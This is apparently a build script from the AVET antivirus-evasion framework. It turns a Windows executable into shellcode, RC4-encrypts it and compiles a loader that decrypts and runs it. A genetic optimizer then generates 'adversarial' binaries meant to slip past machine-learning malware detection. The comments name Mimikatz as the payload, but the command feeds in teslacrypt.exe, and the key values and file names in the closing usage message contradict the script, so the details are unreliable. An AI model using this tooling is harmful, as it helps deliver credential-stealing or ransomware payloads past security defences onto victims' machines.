#!/bin/bash          


#DESCRIPTION_START
# RC4-encrypt the payload with a static, preset key.
# Here, the mimikatz executable is used as payload, converted into shellcode format by pe_to_shellcode.
# pe_to_shellcode is written by Hasherezade:
# https://github.com/hasherezade/pe_to_shellcode

# This script expects the Mimikatz executable to be at input/mimikatz.exe
# and the pe_to_shellcode executable to reside in a folder parallel to avet: ../pe_to_shellcode/pe2shc.exe
#DESCRIPTION_END


# print AVET logo
cat banner.txt

# include script containing the compiler var $win64_compiler
# you can edit the compiler in build/global_win64.sh
# or enter $win64_compiler="mycompiler" here
. build/global_win64.sh

# import feature construction interface
. build/feature_construction.sh


#CONFIGURATION_START
# enable debug output
enable_debug_print
# no command preexec
set_command_source no_data
set_command_exec no_command
# generate key file with preset key
generate_key preset aabbccdd1122 input/key_raw.txt
#CONFIGURATION_END


# convert mimikatz executable into shellcode format
# Can be of course used with other .exe files
wine ./../pe_to_shellcode/pe2shc.exe input/teslacrypt.exe input/sc_raw.txt
# encrypt payload
encode_payload rc4 input/sc_raw.txt input/sc_enc_raw.txt input/key_raw.txt

# convert encoded, raw payload into c format for static include
./tools/data_raw_to_c/data_raw_to_c input/sc_enc_raw.txt input/sc_enc_c.txt buf

# set payload source
set_payload_source static_from_file input/sc_enc_c.txt

# set decoder
set_decoder rc4

# convert key to c format and include statically
./tools/data_raw_to_c/data_raw_to_c input/key_raw.txt input/key_c.txt key
set_key_source static_from_file input/key_c.txt

# set payload info source
set_payload_info_source no_data

# set shellcode binding technique
set_payload_execution_method exec_shellcode64


# compile to exe file
$win64_compiler -o output/rc4enc_mimikatz_adversarial_win64.exe source/avet.c
strip output/rc4enc_mimikatz_adversarial_win64.exe

# generate adversarial example
practical_manipulation="section_injection"
population_size=100

$genetic_optimizer -pm $practical_manipulation -p $population_size output/rc4enc_mimikatz_adversarial_win64.exe

# Or use practical manipulation without optimizer
# gen_adversarial_exe section_injection output/rc4enc_mimikatz_adversarial_win64.exe

# cleanup
cleanup_techniques


echo "
# The decryption key is aabbccddee if it has not been changed.
# You need to provide the decryption key as 2nd command line argument.
# Call generated executable on target like:
# $ rc4enc_mimikatz_win64.exe [your mimikatz arguments, probably 'coffee']  [decryption key]
"
